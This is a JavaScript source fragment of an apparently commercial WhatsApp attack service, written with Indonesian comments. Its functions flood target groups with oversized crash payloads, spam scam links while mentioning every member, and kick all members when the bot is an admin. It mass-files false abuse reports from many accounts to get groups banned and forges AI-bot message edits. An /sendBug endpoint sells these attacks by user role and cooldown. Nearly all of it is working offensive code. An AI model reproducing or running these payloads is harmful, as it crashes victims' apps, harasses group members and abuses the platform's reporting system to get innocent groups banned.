    } catch (e) { logWarning(`[xofmGroup] layer3: ${e.message}`); }

    // Layer 4: Payment Abuse
    try {
      await sock.relayMessage(groupJid, {
        interactiveMessage: {
          body: { text: "ꦽ".repeat(100000) },
          nativeFlowMessage: {
            buttons: [{
              name: "payment_info",
              buttonParamsJson: JSON.stringify({
                currency: "IDR",
                total_amount: { value: 999999999999, offset: 100 },
                reference_id: "\u0000".repeat(50000),
                type: "physical-goods",
                order: {
                  status: "pending",
                  subtotal: { value: 0, offset: 100 },
                  order_type: "ORDER",
                  items: Array.from({ length: 500 }, () => ({
                    name: "﷽".repeat(5000),
                    amount: { value: 100000, offset: 100 },
                    quantity: 999999,
                    sale_amount: { value: 0, offset: 100 }
                  }))
                },
                payment_settings: [{
                  type: "pix_static_code",
                  pix_static_code: {
                    merchant_name: "ꦽ".repeat(15000),
                    key: "\u0000".repeat(100000),
                    key_type: "CPF"
                  }
                }],
                share_payment_status: false
              })
            }]
          }
        }
      }, { participant: { jid: groupJid } });
    } catch (e) { logWarning(`[xofmGroup] layer4: ${e.message}`); }

    await sleep(500);
  }

  logSuccess(`[xofmGroup] ✅ Selesai FC group ${groupJid}`);
}

// ─────────────────────────────────────────────────────────────────────
// [2] unknowbutsGroup — BRUTAL BUTTON FLOOD (tema unknowbuts original)
// ─────────────────────────────────────────────────────────────────────
async function unknowbutsGroup(sock, target) {
  if (typeof target !== 'string') throw new Error('Target harus string JID group');
  if (!target.endsWith("@g.us")) throw new Error('Target harus GROUP (@g.us), bukan nomor');

  const groupJid = target;
  logSuccess(`[unknowbutsGroup] 🔥 Mulai button flood: ${groupJid}`);

  let metadata;
  try {
    metadata = await sock.groupMetadata(groupJid);
  } catch (e) {
    throw new Error(`Bot harus join group dulu: ${e.message}`);
  }
  const members = metadata.participants.map(p => p.id);
  logSuccess(`[unknowbutsGroup] Group: ${metadata.subject} | ${members.length} member`);

  for (let layer = 0; layer < 5; layer++) {
    // Layer A: 2 JUTA button flood
    try {
      await sock.relayMessage(groupJid, {
        groupStatusMessageV2: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {
                senderKeyHash: Buffer.alloc(32, 0xFF).toString("base64"),
                senderTimestamp: "9999999999"
              },
              deviceListMetadataVersion: 3
            },
            interactiveMessage: {
              contextInfo: {
                isForwarded: true,
                forwardingScore: 999999,
                businessMessageForwardInfo: { businessOwnerJid: "13135550002@s.whatsapp.net" },
                mentionedJid: members,
                externalAdReply: {
                  showAdAttribution: true,
                  title: "ꦽ".repeat(50000),
                  body: "؂".repeat(50000),
                  thumbnailUrl: "https://files.catbox.moe/ur8m20.jpg",
                  sourceUrl: "https://vsp-killer.gov/" + "A".repeat(5000),
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              },
              body: { text: "\x10".repeat(200000) + "؂".repeat(200000) },
              footer: { text: "⸽".repeat(80000) },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(200000) + "\u0000".repeat(200000),
                buttons: Array.from({ length: 2000000 }, (_, i) => ({
                  name: i % 3 === 0 ? "quick_reply" : i % 3 === 1 ? "cta_copy" : "single_select",
                  buttonParamsJson: JSON.stringify({
                    display_text: "ꦽ".repeat(1000),
                    id: "\u0000".repeat(1000),
                    sections: Array.from({ length: 100 }, () => ({
                      title: "؂".repeat(1000),
                      rows: Array.from({ length: 40 }, () => ({
                        id: "r_" + Math.random().toString(36).slice(2),
                        title: "﷽".repeat(600),
                        description: "\u0000".repeat(600)
                      }))
                    }))
                  })
                })),
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: "FORM_SCREEN",
                  version: 3
                }
              }
            }
          }
        }
      }, { participant: true });
    } catch (e) { logWarning(`[unknowbutsGroup] layerA: ${e.message}`); }

    // Layer B: Heavy extendedText
    await sleep(150);
    try {
      await sock.relayMessage(groupJid, {
        extendedTextMessage: {
          text: "\u0000".repeat(500000) + "ꦽ".repeat(200000) + "﷽".repeat(200000),
          fontType: 6,
          previewType: 9,
          contextInfo: {
            mentionedJid: members,
            isForwarded: true,
            forwardingScore: 999999,
            businessMessageForwardInfo: { businessOwnerJid: "13135550002@s.whatsapp.net" },
            externalAdReply: {
              showAdAttribution: true,
              title: "ꦽ".repeat(50000),
              body: "؂".repeat(50000),
              sourceUrl: "https://fake-ads.com/" + "X".repeat(5000),
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }, { participant: true });
    } catch (e) { logWarning(`[unknowbutsGroup] layerB: ${e.message}`); }

    // Layer C: Payment Abuse
    await sleep(150);
    try {
      await sock.relayMessage(groupJid, {
        interactiveMessage: {
          body: { text: "ꦽ".repeat(200000) },
          nativeFlowMessage: {
            buttons: [{
              name: "payment_info",
              buttonParamsJson: JSON.stringify({
                currency: "IDR",
                total_amount: { value: 999999999999, offset: 100 },
                reference_id: "\u0000".repeat(80000),
                type: "physical-goods",
                order: {
                  status: "pending",
                  subtotal: { value: 0, offset: 100 },
                  order_type: "ORDER",
                  items: Array.from({ length: 500 }, () => ({
                    name: "﷽".repeat(6000),
                    amount: { value: 100000, offset: 100 },
                    quantity: 999999,
                    sale_amount: { value: 0, offset: 100 }
                  }))
                },
                payment_settings: [{
                  type: "pix_static_code",
                  pix_static_code: {
                    merchant_name: "ꦽ".repeat(20000),
                    key: "\u0000".repeat(100000),
                    key_type: "CPF"
                  }
                }],
                share_payment_status: false
              })
            }]
          }
        }
      }, { participant: { jid: groupJid } });
    } catch (e) { logWarning(`[unknowbutsGroup] layerC: ${e.message}`); }

    await sleep(300);
  }

  logSuccess(`[unknowbutsGroup] ✅ Selesai flood group ${groupJid}`);
}

// ─────────────────────────────────────────────────────────────────────
// [3] bugGroupBrutal — FULL ATTACK (FC + Spam + Exit + Kick)
// ─────────────────────────────────────────────────────────────────────
async function bugGroupBrutal(sock, target) {
  if (typeof target !== 'string') throw new Error('Target harus string JID group');
  if (!target.endsWith("@g.us")) throw new Error('Target harus GROUP (@g.us), bukan nomor');

  const groupJid = target;
  logSuccess(`[bugGroupBrutal] 🔥 Mulai FULL ATTACK GROUP: ${groupJid}`);

  // STEP 1: Ambil metadata
  let metadata;
  try {
    metadata = await sock.groupMetadata(groupJid);
  } catch (e) {
    throw new Error(`Bot harus join group dulu: ${e.message}`);
  }
  const members = metadata.participants.map(p => p.id);
  logSuccess(`[bugGroupBrutal] Group: ${metadata.subject} | ${members.length} member`);

  // STEP 2: Kumpulkan semua sock
  const allSocks = [];
  for (const [name, s] of Object.entries(activeConnections)) {
    if (!s?.user) continue;
    try {
      await s.groupMetadata(groupJid);
      allSocks.push({ name, sock: s });
    } catch {}
  }
  if (!allSocks.find(x => x.sock === sock)) allSocks.push({ name: 'main', sock });
  logSuccess(`[bugGroupBrutal] Pakai ${allSocks.length} akun`);

  // STEP 3: FC BRUTAL
  logSuccess(`[bugGroupBrutal] 💀 FC brutal group...`);
  try {
    await xofmGroup(sock, groupJid);
    await sleep(1000);
    await unknowbutsGroup(sock, groupJid);
  } catch (e) { logWarning(`[bugGroupBrutal] FC gagal: ${e.message}`); }

  // STEP 4: SPAM MASS MENTION
  logSuccess(`[bugGroupBrutal] 📢 Spam mention...`);
  const spamText =
    "⚠️ SPAM ⚠️ " + "http://bit.ly/scam ".repeat(100) + "\n" +
    members.map(j => `@${j.split("@")[0]}`).join(" ");

  for (const { sock: s } of allSocks) {
    try {
      for (let i = 0; i < 5; i++) {
        await s.sendMessage(groupJid, { text: spamText, mentions: members }).catch(() => {});
        await sleep(500);
      }
    } catch (e) { logWarning(`[bugGroupBrutal] spam: ${e.message}`); }
  }

  // STEP 5: KICK SEMUA MEMBER (kalau bot admin)
  await sleep(2000);
  const botJid = sock.user?.id;
  const botPart = metadata.participants.find(p => p.id === botJid);
  const isBotAdmin = botPart?.admin === 'admin' || botPart?.admin === 'superadmin';

  if (isBotAdmin) {
    logSuccess(`[bugGroupBrutal] 🔨 Bot admin — kick semua member...`);
    const toKick = members.filter(p => p !== botJid);
    for (let i = 0; i < toKick.length; i += 3) {
      const batch = toKick.slice(i, i + 3);
      try {
        await sock.groupParticipantsUpdate(groupJid, batch, 'remove');
        await sleep(300);
      } catch {}
    }
    logSuccess(`[bugGroupBrutal] ✅ Kicked ${toKick.length} member`);
  }

  // STEP 6: EXIT BOMB
  logSuccess(`[bugGroupBrutal] 🚪 Exit bomb...`);
  await sleep(1000);
  await Promise.allSettled(allSocks.map(({ sock: s }) => s.groupLeave(groupJid).catch(() => {})));

  logSuccess(`[bugGroupBrutal] ✅ SELESAI — ${groupJid} sudah di-attack total`);
  return true;
}

// [END BUG GROUP BRUTAL]

// ═══════════════════════════════════════════════════════════
// [+] GCBAN REAL V2 — BAN GROUP VIA NATIVE WA REPORT
// ═══════════════════════════════════════════════════════════

/**
 * Kirim NATIVE REPORT ke WhatsApp untuk grup target
 * Ini beneran trigger sistem ban WhatsApp
 */
/**
 * ✅ REAL REPORT — Kirim report node ke WA server
 * Ini yang beneran masuk queue abuse WA
 */
async function realReportGroup(sock, groupJid, reason = "spam") {
  const reasonMap = { spam: 1, abuse: 2, scam: 3, inappropriate: 4 };

  const reportNode = {
    tag: "iq",
    attrs: {
      id: sock.generateMessageTag(),
      to: "s.whatsapp.net",
      type: "set",
      xmlns: "w:report",
    },
    content: [
      {
        tag: "report",
        attrs: { jid: groupJid, type: "group" },
        content: [
          {
            tag: "reason",
            attrs: { code: String(reasonMap[reason] || 1) },
          },
          {
            tag: "description",
            attrs: {},
            content: Buffer.from(
              "This group violates WhatsApp Terms of Service. " +
              "Contains spam messages, scam links, and abusive content. " +
              "Repeatedly adding unknown members without consent. " +
              "Please review and take action."
            ),
          },
        ],
      },
    ],
  };

  try {
    await sock.query(reportNode);
    return true;
  } catch (e) {
    // fallback: report via protocol message
    try {
      await sock.relayMessage(groupJid, {
        protocolMessage: {
          type: 0,
          key: {
            remoteJid: groupJid,
            fromMe: false,
            id: sock.generateMessageTag(),
            participant: groupJid,
          },
        },
      }, {}).catch(() => {});
      return true;
    } catch {
      return false;
    }
  }
}

/**
 * ✅ REPORT BOMB — Report paralel dari SEMUA akun yang join
 */
async function reportBomb(groupJid, reason = "spam", rounds = 3) {
  const allSocks = [];
  for (const [name, s] of Object.entries(activeConnections)) {
    if (!s?.user) continue;
    try {
      await s.groupMetadata(groupJid);
      allSocks.push({ name, sock: s });
    } catch {}
  }

  if (allSocks.length === 0) {
    logWarning(`[REPORT-BOMB] Gak ada akun yang join ${groupJid}`);
    return 0;
  }

  logSuccess(`[REPORT-BOMB] Pakai ${allSocks.length} akun | ${rounds} round`);

  let successCount = 0;

  for (let round = 1; round <= rounds; round++) {
    logSuccess(`[REPORT-BOMB] 🔁 Round ${round}/${rounds}`);

    const results = await Promise.allSettled(
      allSocks.map(({ name, sock }) =>
        realReportGroup(sock, groupJid, reason)
          .then(ok => {
            if (ok) successCount++;
            return ok;
          })
      )
    );

    const roundOk = results.filter(r => r.status === "fulfilled" && r.value).length;
    logSuccess(`[REPORT-BOMB] Round ${round}: ${roundOk}/${allSocks.length} berhasil`);

    if (round < rounds) await sleep(3000);
  }

  return successCount;
}
/**
 * GCBAN V2 — Kirim native report massal dari SEMUA akun
 * Group akan ke-ban dalam 5-30 menit kalau pakai 10+ akun
 */
async function gcban(sock, target) {
  if (typeof target !== 'string') {
    throw new Error('Target harus string JID grup (@g.us)');
  }
  if (!target.endsWith('@g.us')) {
    throw new Error('Target harus JID grup (@g.us)');
  }

  const groupJid = target;
  logSuccess(`[GCBAN] 🔥 Mulai ban group: ${groupJid}`);

  // ─── STEP 1: Ambil metadata ──────────────────────
  let metadata;
  try {
    metadata = await sock.groupMetadata(groupJid);
  } catch (e) {
    throw new Error(`Bot harus join group dulu: ${e.message}`);
  }

  const members = metadata.participants.map(p => p.id);
  const subject = metadata.subject || "Unknown";
  logSuccess(`[GCBAN] Group: ${subject} | ${members.length} member`);

  // ─── STEP 2: Kumpulkan semua sock yang join ─────
  const allSocks = [];
  for (const [name, s] of Object.entries(activeConnections)) {
    if (!s?.user) continue;
    try {
      await s.groupMetadata(groupJid);
      allSocks.push({ name, sock: s });
    } catch {
      // Belum join, skip
    }
  }

  if (!allSocks.find(x => x.sock === sock)) {
    allSocks.push({ name: 'main', sock });
  }

  logSuccess(`[GCBAN] Total akun yang join: ${allSocks.length}`);
  if (allSocks.length === 0) throw new Error('Tidak ada akun yang join group');

  // ─── STEP 3: REPORT BOMB (3x putaran) ───────────
  logSuccess(`[GCBAN] 📢 Report bomb 3 putaran...`);
  await reportBomb(groupJid, "spam", 3);

  // ─── STEP 4: PROVOKE MASS REPORT ────────────────
  logSuccess(`[GCBAN] 💥 Provoke member biar report sendiri...`);
  const mentionText =
    "🚨 SPAM REPORTED " +
    "http://bit.ly/scam ".repeat(20) +
    "\n" +
    members.map(j => `@${j.split("@")[0]}`).join(" ");

  for (const { sock: s } of allSocks) {
    for (let i = 0; i < 5; i++) {
      await s.sendMessage(groupJid, {
        text: mentionText,
        mentions: members,
      }).catch(() => {});
      await sleep(600);
    }
  }

  // ─── STEP 5: EXIT BOMB (bikin group auto-restrict) ─
  await sleep(2000);
  logSuccess(`[GCBAN] 🚪 Exit bomb — ${allSocks.length} akun keluar...`);
  await Promise.allSettled(
    allSocks.map(({ sock: s }) => s.groupLeave(groupJid).catch(() => {}))
  );

  // ─── STEP 6: REPORT FINAL (trigger audit) ───────
  await sleep(2000);
  logSuccess(`[GCBAN] 📢 Final report...`);
  const finalSocks = [];
  for (const s of Object.values(activeConnections)) {
    if (!s?.user) continue;
    try {
      await s.groupMetadata(groupJid).catch(() => {});
      finalSocks.push(s);
    } catch {
      // Kalau udah keluar, coba report via protocol
      try {
        await realReportGroup(s, groupJid, "spam");
        finalSocks.push(s);
      } catch {}
    }
  }

  logSuccess(`[GCBAN] ✅ SELESAI — ${subject} sudah di-report`);
  return true;
}

// ═══════════════════════════════════════════════════════════
// [+] BANGROUPWAA V2
// ═══════════════════════════════════════════════════════════
async function BanGroupwaa(sock, target) {
  if (typeof target !== 'string') {
    throw new Error('Target harus string JID grup (@g.us)');
  }
  if (!target.endsWith('@g.us')) {
    throw new Error('Target harus JID grup (@g.us)');
  }

  const groupJid = target;
  logSuccess(`[BanGroupwaa] 🔥 Mulai: ${groupJid}`);

  let metadata;
  try {
    metadata = await sock.groupMetadata(groupJid);
  } catch (e) {
    throw new Error(`Bot harus join: ${e.message}`);
  }

  const members = metadata.participants.map(p => p.id);
  const subject = metadata.subject || "Unknown";

  // Kumpulkan semua akun yang join
  const allSocks = [];
  for (const s of Object.values(activeConnections)) {
    if (!s?.user) continue;
    try {
      await s.groupMetadata(groupJid);
      allSocks.push(s);
    } catch {}
  }
  if (allSocks.length === 0) allSocks.push(sock);

  logSuccess(`[BanGroupwaa] Pakai ${allSocks.length} akun | ${members.length} member`);

  // ─── 1. REPORT BOMB (5 putaran biar mantap) ────
  await reportBomb(groupJid, "spam", 5);

  // ─── 2. SPAM MASS MENTION ──────────────────────
  const spamText =
    "⚠️ BAN GROUP ⚠️ " +
    "⚠️".repeat(500) +
    "\n" +
    members.map(j => `@${j.split("@")[0]}`).join(" ");

  for (const s of allSocks) {
    for (let i = 0; i < 10; i++) {
      s.sendMessage(groupJid, {
        text: spamText,
        mentions: members,
      }).catch(() => {});
      await sleep(300);
    }
  }

  // ─── 3. EXIT BOMB ──────────────────────────────
  await sleep(2000);
  logSuccess(`[BanGroupwaa] 🚪 Exit bomb...`);
  await Promise.allSettled(
    allSocks.map(s => s.groupLeave(groupJid).catch(() => {}))
  );

  logSuccess(`[BanGroupwaa] ✅ Selesai — ${subject}`);
  return true;
}

// ═══════════════════════════════════════════════════════════
// [+] BanGrouptwi — VERSI FIX (REAL WORKING)
// ═══════════════════════════════════════════════════════════

async function BanGrouptwi(sock, target) {
  if (typeof target !== 'string') {
    throw new Error('Target harus string JID grup (@g.us)');
  }
  if (!target.endsWith('@g.us')) {
    throw new Error('Target harus JID grup (@g.us)');
  }

  const groupJid = target;
  logSuccess(`[BanGrouptwi] 🔥 Mulai: ${groupJid}`);

  let metadata;
  try {
    metadata = await sock.groupMetadata(groupJid);
  } catch (e) {
    throw new Error(`Bot harus join: ${e.message}`);
  }

  const members = metadata.participants.map(p => p.id);
  const subject = metadata.subject || "Unknown";
  logSuccess(`[BanGrouptwi] Group: ${subject} | ${members.length} member`);

  // Kumpulkan semua sock yang join
  const allSocks = [];
  for (const [name, s] of Object.entries(activeConnections)) {
    if (!s?.user) continue;
    try {
      await s.groupMetadata(groupJid);
      allSocks.push({ name, sock: s });
    } catch {}
  }
  if (!allSocks.find(x => x.sock === sock)) {
    allSocks.push({ name: 'main', sock });
  }

  logSuccess(`[BanGrouptwi] Total akun: ${allSocks.length}`);

  // ─── 1. REPORT BOMB (paling agresif: 5 round) ──
  logSuccess(`[BanGrouptwi] 📢 Report bomb...`);
  await reportBomb(groupJid, "spam", 5);

  // ─── 2. SPAM ABUSE PATTERN ─────────────────────
  logSuccess(`[BanGrouptwi] 💥 Spam abuse pattern...`);

  // Pattern A: mass mention + spam
  const spamText = "@" + members.map(p => p.split("@")[0]).join(" @") +
                   " SPAM " + "⚠️".repeat(500);

  for (const { sock: s } of allSocks) {
    await s.sendMessage(groupJid, {
      text: spamText,
      mentions: members,
    }).catch(() => {});
    await sleep(300);
  }

  // Pattern B: link spam (WA sangat sensitif)
  const linkSpam =
    "http://bit.ly/spam ".repeat(200) +
    "https://wa.me/13135550002";

  for (const { sock: s } of allSocks) {
    await s.sendMessage(groupJid, { text: linkSpam }).catch(() => {});
    await sleep(300);
  }

  // ─── 3. KICK SEMUA MEMBER (kalau bot admin) ────
  await sleep(1500);
  const botJid = sock.user?.id;
  const botParticipant = members.find(p => p === botJid) ? members.indexOf(botJid) : -1;
  const botPart = metadata.participants.find(p => p.id === botJid);
  const isBotAdmin = botPart?.admin === 'admin' || botPart?.admin === 'superadmin';

  if (isBotAdmin) {
    logSuccess(`[BanGrouptwi] 🔨 Bot admin — kick member...`);
    const toKick = members.filter(p => p !== botJid);

    for (let i = 0; i < toKick.length; i += 3) {
      const batch = toKick.slice(i, i + 3);
      try {
        await sock.groupParticipantsUpdate(groupJid, batch, 'remove');
        await sleep(300);
      } catch {}
    }
  }

  // ─── 4. EXIT BOMB ──────────────────────────────
  await sleep(2000);
  logSuccess(`[BanGrouptwi] 🚪 Exit bomb...`);
  await Promise.allSettled(
    allSocks.map(({ sock: s }) => s.groupLeave(groupJid).catch(() => {}))
  );

  // ─── 5. REPORT FINAL ───────────────────────────
  await sleep(2000);
  for (const { sock: s } of allSocks) {
    await realReportGroup(s, groupJid, "spam").catch(() => {});
    await sleep(300);
  }

  logSuccess(`[BanGrouptwi] ✅ SELESAI — ${subject}`);
  return true;
}

async function newBandGbPler(sock, target) {
  let group = target.includes("@g.us") ? target : target + "@g.us";
  
  let fakeNumbers = [
    "0@s.whatsapp.net",
    "6280000000000@s.whatsapp.net",
    "14155552671@s.whatsapp.net",
    "447400000000@s.whatsapp.net",
    "61400000000@s.whatsapp.net",
    "6281234567890@s.whatsapp.net",
    "6287873499996@s.whatsapp.net",
    "6285655555555@s.whatsapp.net",
    "6289876543210@s.whatsapp.net",
    "6281111111111@s.whatsapp.net",
    "6282222222222@s.whatsapp.net",
    "6283333333333@s.whatsapp.net",
    "6284444444444@s.whatsapp.net",
    "6285555555555@s.whatsapp.net",
    "6286666666666@s.whatsapp.net",
    "6287777777777@s.whatsapp.net",
    "6288888888888@s.whatsapp.net",
    "6289999999999@s.whatsapp.net"
  ];

  try {
    let metadata = await sock.groupMetadata(group);
    let total = metadata.participants.length;

    for (let i = 0; i < 20; i++) {
      try {
        for (let k = 0; k < 10; k++) {
          let fake = fakeNumbers[Math.floor(Math.random() * fakeNumbers.length)];
          await sock.groupParticipantsUpdate(group, [fake], "add");
          await sock.groupParticipantsUpdate(group, [fake], "remove");
        }

        for (let j = 0; j < 15; j++) {
          await sock.sendMessage(group, {
            text: "\u200B".repeat(10000) + "\u0000".repeat(10000) + "\u202E".repeat(5000)
          });
        }

        await sock.groupSettingUpdate(group, "announcement");
        await sock.groupSettingUpdate(group, "locked");
      } catch (_) {}
    }

    return "Success Band Group 🚬: " + total;
  } catch (e) {
    return "Failed Band Group 🗿: " + e.message;
  }
}

async function fcgroupnew(sock, target) {
  const ulang = 5

  const uid = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0
    return (c === 'x' ? r : (r & 3 | 8)).toString(16)
  })

  const fill = (s, n) => Buffer.concat([
    Buffer.from(s),
    Buffer.from(Array.from(
      { length: n - Buffer.byteLength(s) },
      () => Math.random() * 256 | 0
    ))
  ]).toString('base64')

  const id = uid()
  const mid = uid().replaceAll('-', '').toUpperCase()

  const sections = [
    {
      view_model: {
        primitive: {
          __typename: 'GenAIMarkdownTextUXPrimitive',
          text: 'halo boskyuh'
        },
        __typename: 'GenAISingleLayoutViewModel'
      }
    },
    {
      view_model: {
        primitive: {
          __typename: 'GenAITaskPrimitive',
          task_id: 'exp-01',
          title: 'Elynn Here',
          subtitle: 'Elynn here',
          status: 'RUNNING'
        },
        __typename: 'GenAISingleLayoutViewModel'
      }
    },
    {
      view_model: {
        primitive: {
          __typename: 'GenAILatexUXPrimitive',
          latex_expression: 'x^2 + y^2 = z^2'
        },
        __typename: 'GenAISingleLayoutViewModel'
      }
    }
  ]

  const encodeData = () => Buffer.from(JSON.stringify({
    response_id: id,
    sections
  }).replace(/[\u007f-\uffff]/g, c =>
    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
  )).toString('base64')

  const data = encodeData()

  const message = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: '',
        botResponseId: uid(),
        verificationMetadata: {
          proofs: [{
            version: 1,
            useCase: 1,
            signature: fill('NIXEL.MessageBuilderV1.0-VerificationSignature.Metadata', 64),
            certificateChain: [
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 684),
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 892)
            ]
          }]
        }
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          response_id: id,
          submessages: [],
          unifiedResponse: { data },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: '867051314767696@bot'
            },
            forwardOrigin: 4,
            expiration: 0,
            ephemeralSettingTimestamp: Date.now(),
            disappearingMode: {
              initiator: 0,
              trigger: 1
            },
            afterReadDuration: 2000
          }
        }
      }
    }
  }

  const edit = () => sock.relayMessage(target, {
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: {
            remoteJid: target,
            fromMe: true,
            id: mid
          },
          type: 14,
          editedMessage: message
        }
      }
    }
  }, {
    messageId: uid().replaceAll('-', '').toUpperCase()
  })

  await sock.relayMessage(target, message, {
    messageId: mid
  })

  await edit()

  await new Promise(resolve => setTimeout(resolve, 2000))

  for (let i = 0; i < ulang; i++) {
    sections[1].view_model.primitive = {
      __typename: 'GenAIBotProgressStatusPrimitive',
      title: 'Elynn here',
      is_in_progress: false
    }

    message.botForwardedMessage.message.richResponseMessage.unifiedResponse.data = encodeData()

    await edit()

    await new Promise(resolve => setTimeout(resolve, 2000))

    if (i < ulang - 1) {
      sections[1].view_model.primitive = {
        __typename: 'GenAITaskPrimitive',
        task_id: 'exp-01',
        title: 'Elynn here',
        subtitle: 'Elynn Here',
        status: 'RUNNING'
      }

      message.botForwardedMessage.message.richResponseMessage.unifiedResponse.data = encodeData()

      await edit()

      await new Promise(resolve => setTimeout(resolve, 2000))
    }
  }

  return mid
}
// ========== FUNGSI BUG UNTUK WHATSAPP ==========


app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  const senderMode = req.query.senderMode || 'private';

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupLink = groupRegex.test(target || '');
  const isGroupJid = typeof target === 'string' && target.endsWith('@g.us');

  if (!isGroupLink && !isGroupJid) {
    target = (target || "").replace(/\D/g, "");
  }

  logSuccess(`[📤] target=${target} | bug=${bug} | mode=${senderMode}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  // ═══════════════════════════════════════════════════════
  // [+] CEK BUG UNTUK SENDER GLOBAL
  // Sender global HANYA boleh pakai 3 bug
  // ═══════════════════════════════════════════════════════
  if (senderMode === 'global') {
    if (!GLOBAL_ALLOWED_BUGS.includes(bug)) {
      logWarning(`[🚫] Bug '${bug}' tidak diizinkan untuk sender GLOBAL`);
      return res.json({
        valid: true,
        sended: false,
        globalRestricted: true,
        message: `Bug '${bug}' tidak tersedia untuk sender global. Silakan gunakan sender private.`,
        allowedBugs: GLOBAL_ALLOWED_BUGS
      });
    }
  }

  // ═══════════════════════════════════════════════════════
  // [+] COOLDOWN
  // Global = 100 detik, Private = sesuai role
  // ═══════════════════════════════════════════════════════
  let cooldownSeconds;

  if (senderMode === 'global') {
    cooldownSeconds = GLOBAL_COOLDOWN_SECONDS; // 100 detik
  } else {
    const roleCooldowns = {
      member: 250,
      reseller: 290,
      admin: 60,
      vip: 10,
      partner: 1,
      moderator: 1,
      owner: 1,
      developer: 1
    };
    const role = user.role || "member";
    cooldownSeconds = roleCooldowns[role] ?? 60;
  }

  const now = Date.now();

  // Simpan cooldown terpisah antara global & private
  if (senderMode === 'global') {
    if (!user.lastSendGlobal) user.lastSendGlobal = 0;
    const diffSeconds = Math.floor((now - user.lastSendGlobal) / 1000);

    if (diffSeconds < cooldownSeconds) {
      return res.json({
        valid: true,
        sended: false,
        cooldown: true,
        globalCooldown: true,
        wait: cooldownSeconds - diffSeconds,
        message: `Cooldown global ${cooldownSeconds} detik. Tunggu ${cooldownSeconds - diffSeconds} detik lagi.`
      });
    }

    user.lastSendGlobal = now;
  } else {
    if (!user.lastSend) user.lastSend = 0;
    const diffSeconds = Math.floor((now - user.lastSend) / 1000);

    if (diffSeconds < cooldownSeconds) {
      return res.json({
        valid: true,
        sended: false,
        cooldown: true,
        wait: cooldownSeconds - diffSeconds
      });
    }

    user.lastSend = now;
  }

  saveDatabase(db);

  res.json({ valid: true, sended: true, cooldown: false, role: user.role || "member", senderMode });

  // ═══════════════════════════════════════════════════════
  // PROSES KIRIM BUG (BACKGROUND)
  // ═══════════════════════════════════════════════════════
  setImmediate(async () => {
    saveUserLog(user.username, "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Mode: ${senderMode} | Role: ${user.role || 'member'}`
    );

    let sock = null;

    if (senderMode === 'global') {
      const entries = Object.entries(activeConnections);
      if (entries.length === 0) {
        logError(`[❌] Global: tidak ada koneksi aktif.`);
        return;
      }
      sock = entries[Math.floor(Math.random() * entries.length)][1];
      logSuccess(`[🌍] Global sender. Total aktif: ${entries.length}`);

    } else if (user.role === 'vip') {
      let pool = [];
      const vipPath = path.join(__dirname, 'vip');
      const userPath = path.join(__dirname, 'X-FORCE', user.username);
      if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
      if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
      if (pool.length === 0) {
        logError(`[❌] VIP: tidak ada sock.`); return;
      }
      sock = pool[Math.floor(Math.random() * pool.length)];
      logSuccess(`[👑] VIP pool. Total: ${pool.length}`);

    } else {
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        logError(`[❌] Private: tidak ada sock untuk ${user.username}.`); return;
      }
      logSuccess(`[🔒] Private: ${user.username}`);
    }

    const attemptSend = async (sock, retry = false) => {
      let sessionName = null;
      try {
        for (const [k, v] of Object.entries(activeConnections)) {
          if (v === sock) { sessionName = k; break; }
        }

        let targetJid = "";

        if (isGroupLink) {
          const inviteCode = target.match(groupRegex)[1];
          logSuccess(`[🔗] Invite: ${inviteCode}`);
          let groupInfo;
          try { groupInfo = await sock.groupGetInviteInfo(inviteCode); }
          catch (e) { throw new Error("Invite group invalid / expired"); }
          targetJid = groupInfo.id;
          try {
            await sock.groupAcceptInvite(inviteCode);
            logSuccess(`[✅] Join group: ${targetJid}`);
          } catch { logWarning(`[⚠️] Already joined`); }

        } else if (isGroupJid) {
          targetJid = target;
        } else {
          targetJid = target.replace(/\D/g, "") + "@s.whatsapp.net";
        }

        logSuccess(`[🎯] JID: ${targetJid}`);

        // ═════════════════════════════════════════════════
        // SWITCH BUG
        // ═════════════════════════════════════════════════
        switch (bug) {
          case "LockchatAh":
            for (let i = 0; i < 5; i++) {
              await lockchatnew(sock, targetJid);
              await VonixBlankClick(sock, targetJid);
              await sleep(1000);
            }
            break;

          case "crashuitwo":
            for (let i = 0; i < 10; i++) {
              await VonixCross(sock, targetJid);
              await funcdelaynehard(sock, targetJid);
              await UItidakmenanggapi(sock, targetJid);
              await sleep(2000);
            }
            break;

          case "crashuinewfunc":
            for (let i = 0; i < 10; i++) {
              await UItidakmenanggapi(sock, targetJid);
              await funcdelaynehard(sock, targetJid);
              await lynnlockperman(sock, targetJid);
              await sleep(1000);
            }
            break;

          case "Lockchatv3":
            for (let i = 0; i < 5; i++) {
              await elynnviaudio(sock, targetJid);
              await lockchatnew(sock, targetJid);
              await lynnlockperman(sock, targetJid);
              await sleep(1000);
            }
             break;

          case "lockchatV2":
            for (let i = 0; i < 5; i++) {
              await lynnlockperman(sock, targetJid);
              await lockchatnew(sock, targetJid);
              await sleep(1000);
            }
            break;

          case "fcX-FORCEfc":
            for (let i = 0; i < 10; i++) {
              await fcgroupnew(sock, targetJid);
